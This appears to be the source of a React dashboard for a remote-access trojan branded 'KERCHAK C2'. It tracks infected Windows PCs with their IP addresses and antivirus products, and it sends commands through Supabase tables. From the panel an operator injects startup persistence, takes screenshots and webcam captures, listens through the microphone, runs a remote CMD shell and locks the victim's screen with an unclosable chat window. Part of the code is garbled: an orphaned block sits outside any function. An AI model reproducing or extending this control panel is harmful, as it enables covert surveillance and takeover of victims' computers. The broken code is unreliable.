"use client";

import { useEffect, useState } from 'react';
import { supabase } from '@/lib/supabase';
import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X } from 'lucide-react';

interface Computer {
  id: string;
  pc_name: string;
  public_ip: string;
  status: 'online' | 'offline';
  startup_enabled: boolean;
  antivirus: string;
  last_seen: string;
}

export default function Dashboard() {
  const [computers, setComputers] = useState<Computer[]>([]);
  const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | null>(null);
  const [selectedPc, setSelectedPc] = useState<string | null>(null);
  const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
  const [screenshots, setScreenshots] = useState<string[]>([]);
  const [chatMessages, setChatMessages] = useState<{from: string, text: string}[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [activePC, setActivePC] = useState<string | null>(null);
  const [showTerminal, setShowTerminal] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Microsoft Windows [Version 10.0.19045.4412]", "(c) Microsoft Corporation. Tous droits réservés.", ""]);
  const [terminalInput, setTerminalInput] = useState("");
  const [showVoice, setShowVoice] = useState(false);
  const [isAdminMute, setIsAdminMute] = useState(false);
  const [isAdminDeaf, setIsAdminDeaf] = useState(false);
  const [isPcSpeaking, setIsPcSpeaking] = useState(false);
  const [isAdminSpeaking, setIsAdminSpeaking] = useState(false);

  useEffect(() => {
    const fetchComputers = async () => {
      let { data } = await supabase.from('computers').select('*');
      setComputers(data || []);
    }
    fetchComputers();

    const sub = supabase.channel('public:computers')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'computers' }, (payload) => {
        setComputers((current) => {
          const newPc = payload.new as Computer;
          const index = current.findIndex(c => c.id === newPc.id);
          if (index > -1) {
            const updated = [...current];
            updated[index] = newPc;
            return updated;
          }
          return [...current, newPc];
        });
      }).subscribe();

    const interval = setInterval(() => {
      setComputers(current => [...current]); // Force re-render pour isOnline
    }, 10000);

    return () => { supabase.removeChannel(sub); clearInterval(interval); };
  }, []);

  const getAvIcon = (av: string) => {
    const lowAv = av.toLowerCase();
    if (lowAv.includes('bitdefender')) return "https://www.google.com/s2/favicons?domain=bitdefender.com&sz=128";
    if (lowAv.includes('avast')) return "https://www.google.com/s2/favicons?domain=avast.com&sz=128";
    if (lowAv.includes('kaspersky')) return "https://www.google.com/s2/favicons?domain=kaspersky.com&sz=128";
    if (lowAv.includes('defender')) return "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Microsoft_Windows_Defender_icon.svg/128px-Microsoft_Windows_Defender_icon.svg.png";
    if (lowAv.includes('avg')) return "https://www.google.com/s2/favicons?domain=avg.com&sz=128";
    if (lowAv.includes('norton')) return "https://www.google.com/s2/favicons?domain=norton.com&sz=128";
    if (lowAv.includes('eset')) return "https://www.google.com/s2/favicons?domain=eset.com&sz=128";
    if (lowAv.includes('mcafee')) return "https://www.google.com/s2/favicons?domain=mcafee.com&sz=128";
    return "https://cdn-icons-png.flaticon.com/512/752/752712.png"; 
  };

  const deleteComputer = async (id: string, name: string) => {
    if (window.confirm(`Êtes-vous sûr de vouloir supprimer ${name} de la liste ?`)) {
      await supabase.from('computers').delete().eq('id', id);
      setComputers(current => current.filter(c => c.id !== id));
    }
  };

  const isOnline = (lastSeen: string) => {
    if (!lastSeen) return false;
    const last = new Date(lastSeen).getTime();
    const now = new Date().getTime();
    return (now - last) < 120000; // Seuil augmenté à 2 min pour eviter les faux offline
  };

  const fetchScreenshots = async (pcName: string) => {
    const { data } = await supabase.storage.from('kerchak-assets').list('', {
      limit: 10,
      offset: 0,
      sortBy: { column: 'created_at', order: 'desc' },
    });
    if (data) {
      const pcFiles = data.filter(f => f.name.startsWith(pcName));
      const urls = pcFiles.map(f => {
        const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
        return urlData.publicUrl;
      });
      setScreenshots(urls);
    }
  };

  const sendCommand = async (pcId: string, pcName: string, cmd: string, args: string = "") => {
    setSelectedPc(pcId);
    setSelectedPcName(pcName);
    
    await supabase.from('commands').insert({ 
      computer_id: pcId, 
      command: cmd, 
      args: args, 
      status: 'pending' 
    });
    
    if (cmd === 'ss' || cmd === 'webcam') {
      setActiveModal('screenshot');
      setTimeout(() => fetchScreenshots(pcName), 5000);
    } else if (cmd === 'chat_open') {
      setActiveModal('chat');
    }
  };

    if (data) {
      // Filtrer les images qui commencent par le nom du PC
      const pcFiles = data.filter(f => f.name.startsWith(pcName));
      const urls = pcFiles.map(f => {
        const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
        return urlData.publicUrl;
      });
      setScreenshots(urls);
    }
  };

  const sendChatMessage = async () => {
    if (!chatInput.trim() || !selectedPc) return;
    setChatMessages([...chatMessages, {from: 'me', text: chatInput}]);
    await supabase.from('chat_messages').insert({ computer_id: selectedPc, sender: 'admin', message: chatInput, is_read: false });
    setChatInput("");
  };

  return (
    <div className="min-h-screen bg-[#050505] text-gray-200 p-6 font-sans selection:bg-red-500/30">
      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes gradientFlow {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        .animate-gradient-red {
          background: linear-gradient(-45deg, #ef4444, #991b1b, #dc2626, #7f1d1d);
          background-size: 400% 400%;
          animation: gradientFlow 3s ease infinite;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
        .animate-gradient-green {
          background: linear-gradient(-45deg, #22c55e, #14532d, #16a34a, #064e3b);
          background-size: 400% 400%;
          animation: gradientFlow 3s ease infinite;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
        .animate-gradient-title {
          background: linear-gradient(-45deg, #ffffff, #9ca3af, #f3f4f6, #4b5563);
          background-size: 400% 400%;
          animation: gradientFlow 5s ease infinite;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
      `}} />
      <header className="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-600 to-red-900 flex items-center justify-center shadow-[0_0_20px_rgba(220,38,38,0.4)]">
            <Activity className="text-white" size={24} />
          </div>
          <div>
            <h1 className="text-2xl font-bold tracking-wider text-white">KERCHAK <span className="text-red-500">C2</span></h1>
            <p className="text-xs text-gray-500 uppercase tracking-widest">Advanced Command & Control</p>
          </div>
        </div>
        <div className="flex items-center gap-3 bg-white/5 border border-white/10 px-4 py-2 rounded-lg backdrop-blur-md">
          <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
          <span className="text-sm font-medium">{computers.filter(c => isOnline(c.last_seen)).length} Online</span>
        </div>
      </header>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {computers.map(pc => (
          <div key={pc.id} className="relative group bg-[#0a0a0c] border border-white/10 rounded-2xl overflow-hidden hover:border-red-500/50 transition-all duration-300 shadow-xl">
            <div className={`absolute top-0 left-0 w-full h-1 ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e]' : 'bg-gray-600'}`}></div>
            <div className="p-5">
              <div className="flex justify-between items-start mb-4">
                <div>
                  <h3 className="text-xl font-bold text-white group-hover:text-red-400 transition-colors flex items-center gap-2">
                    <Monitor size={18} /> <span className="animate-gradient-title">{pc.pc_name}</span>
                  </h3>
                  <p className="text-xs text-gray-400 mt-1">{pc.public_ip}</p>
                </div>
                <div className="flex items-center gap-3">
                  <div className={`w-3 h-3 rounded-full ${isOnline(pc.last_seen) ? 'bg-green-500 shadow-[0_0_15px_#22c55e] animate-pulse' : 'bg-gray-600'}`}></div>
                  <button onClick={() => deleteComputer(pc.id, pc.pc_name)} className="text-gray-500 hover:text-red-500 transition-colors" title="Delete PC"><X size={20}/></button>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4 mb-6">
                <div className="bg-white/5 p-4 rounded-xl border border-white/10 flex items-center gap-3">
                  <img src={getAvIcon(pc.antivirus)} alt="AV" className="w-8 h-8 object-contain" />
                  <div>
                    <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block">Antivirus</span>
                    <span className="text-red-400 font-bold text-sm animate-gradient-red">{pc.antivirus || 'None'}</span>
                  </div>
                </div>
                <div className="bg-white/5 p-4 rounded-xl border border-white/10">
                  <span className="text-gray-500 text-[10px] uppercase font-bold tracking-widest block mb-1 flex items-center gap-1"><Shield size={12}/> Persistence</span>
                  <div className="flex items-center justify-between">
                    <span className={pc.startup_enabled ? 'animate-gradient-green font-bold text-sm' : 'text-gray-400 text-sm'}>{pc.startup_enabled ? 'ACTIVE' : 'NONE'}</span>
                    {pc.startup_enabled ? (
                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup_remove')} className="text-[10px] bg-red-500/20 text-red-400 px-1 rounded hover:bg-red-500/40">Remove</button>
                    ) : (
                      <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="text-[10px] bg-green-500/20 text-green-400 px-1 rounded hover:bg-green-500/40">Inject</button>
                    )}
                  </div>
                </div>
              </div>
              <div className="grid grid-cols-4 gap-2">
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setShowVoice(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Discord Voice"><Mic size={18}/></button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
                
                <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18}/></button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
              </div>
            </div>
          </div>
        ))}
      </div>

      {activeModal === 'screenshot' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-5xl shadow-2xl">
            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
              <h3 className="font-bold flex items-center gap-2"><Camera size={18}/> Captures</h3>
              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
            </div>
            <div className="p-4 flex gap-4 overflow-x-auto min-h-[300px] items-center justify-center">
              {screenshots.length > 0 ? (
                screenshots.map((url, i) => (
                  <img key={i} src={url} className="max-h-[70vh] rounded-lg border border-white/10 shadow-2xl" alt="PC Screenshot" />
                ))
              ) : (
                <span className="text-gray-500 animate-pulse">Waiting for agent to upload image...</span>
              )}
            </div>
          </div>
        </div>
      )}

      {activeModal === 'chat' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-lg shadow-2xl flex flex-col h-[500px]">
            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
              <h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18}/> Live Chat (Unclosable on Client)</h3>
              <div className="flex gap-2">
                <button onClick={() => { sendCommand(selectedPc!, selectedPcName!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close Client</button>
                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
              </div>
            </div>
            <div className="flex-1 p-4 overflow-y-auto flex flex-col gap-3">
              {chatMessages.map((msg, i) => (
                <div key={i} className={`p-3 rounded-lg max-w-[80%] ${msg.from === 'me' ? 'bg-red-600/20 text-red-200 self-end rounded-tr-none' : 'bg-white/10 text-gray-200 self-start rounded-tl-none'}`}>
                  {msg.text}
                </div>
              ))}
            </div>
            <div className="p-4 border-t border-white/10 flex gap-2">
              <input 
                type="text" value={chatInput} onChange={e => setChatInput(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter') sendChatMessage() }}
                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500" 
                placeholder="Type a message to lock their screen with..." 
              />
              <button onClick={sendChatMessage} className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-lg font-bold text-sm">Send</button>
            </div>
          </div>
        </div>
      )}
      {/* Discord Voice Modal */}
      {showVoice && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl z-50 flex items-center justify-center p-4">
          <div className="w-full max-w-2xl bg-[#313338] rounded-2xl shadow-2xl overflow-hidden border border-white/5">
            <div className="p-6 flex flex-col items-center">
              <h2 className="text-white font-bold mb-8 flex items-center gap-2"><Mic className="text-green-500" /> Salon vocal - {selectedPcName}</h2>
              
              <div className="flex gap-16 mb-12">
                <div className="flex flex-col items-center gap-3">
                  <div className={`w-24 h-24 rounded-full bg-red-600 flex items-center justify-center border-4 transition-all duration-300 ${isAdminSpeaking ? 'border-green-500 scale-110 shadow-[0_0_20px_#22c55e]' : 'border-transparent'}`}>
                    <span className="text-2xl font-bold text-white">AD</span>
                  </div>
                  <span className="text-gray-300 font-medium">Moi (Admin)</span>
                </div>

                <div className="flex flex-col items-center gap-3">
                  <div className={`w-24 h-24 rounded-full bg-gray-700 flex items-center justify-center border-4 transition-all duration-300 ${isPcSpeaking ? 'border-green-500 scale-110 shadow-[0_0_20px_#22c55e]' : 'border-transparent'}`}>
                    <Monitor className="text-gray-400" size={40} />
                  </div>
                  <span className="text-gray-300 font-medium">{selectedPcName?.split(' / ')[1]}</span>
                </div>
              </div>

              <div className="flex gap-4 bg-[#1e1f22] p-4 rounded-2xl border border-white/5 w-full justify-center">
                <button onClick={() => setIsAdminMute(!isAdminMute)} className={`p-4 rounded-xl transition-all ${isAdminMute ? 'bg-red-500 text-white' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Mic size={24} /></button>
                <button onClick={() => setIsAdminDeaf(!isAdminDeaf)} className={`p-4 rounded-xl transition-all ${isAdminDeaf ? 'bg-red-500 text-white' : 'bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]'}`}><Power size={24} /></button>
                <button className="p-4 rounded-xl bg-[#2b2d31] text-gray-300 hover:bg-[#35373c]"><Camera size={24} /></button>
                <button onClick={() => setShowVoice(false)} className="p-4 rounded-xl bg-red-500 text-white hover:bg-red-600 ml-8">Déconnexion</button>
              </div>
            </div>
          </div>
        </div>
      )}
      {showTerminal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="w-full max-w-4xl bg-[#0c0c0c] rounded-lg border border-gray-700 shadow-2xl overflow-hidden font-mono">
            <div className="bg-[#2d2d2d] px-4 py-2 flex justify-between items-center border-b border-gray-600">
              <div className="flex items-center gap-2 text-xs text-gray-300">
                <Terminal size={14} />
                <span>Invite de commande - {activePC}</span>
              </div>
              <button onClick={() => setShowTerminal(false)} className="text-gray-400 hover:text-white"><X size={18}/></button>
            </div>
            <div className="p-4 h-[500px] overflow-y-auto text-sm text-gray-200 custom-scrollbar">
              {terminalOutput.map((line, i) => (
                <div key={i} className="min-h-[1.2rem]">{line}</div>
              ))}
              <div className="flex gap-2 items-center mt-2">
                <span className="text-gray-400">C:\Users\{activePC?.split(' / ')[1] || 'Target'}&gt;</span>
                <input 
                  autoFocus
                  className="bg-transparent border-none outline-none flex-1 text-gray-200"
                  value={terminalInput}
                  onChange={(e) => setTerminalInput(e.target.value)}
                  onKeyDown={async (e) => {
                    if (e.key === 'Enter' && terminalInput) {
                      const cmd = terminalInput;
                      setTerminalOutput([...terminalOutput, `C:\\Users\\${activePC?.split(' / ')[1] || 'Target'}>${cmd}`]);
                      setTerminalInput("");
                      
                      const { data } = await supabase.from('commands').insert({
                        computer_id: computers.find(c => c.pc_name === activePC)?.id,
                        command: 'cmd',
                        args: cmd,
                        status: 'pending'
                      }).select().single();

                      if (data) {
                        // Polling pour le resultat
                        const checkResult = setInterval(async () => {
                          const { data: cmdData } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
                          if (cmdData?.status === 'executed' && cmdData.result) {
                            setTerminalOutput(prev => [...prev, cmdData.result, ""]);
                            clearInterval(checkResult);
                          }
                        }, 2000);
                        setTimeout(() => clearInterval(checkResult), 30000); // Timeout 30s
                      }
                    }
                  }}
                />
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
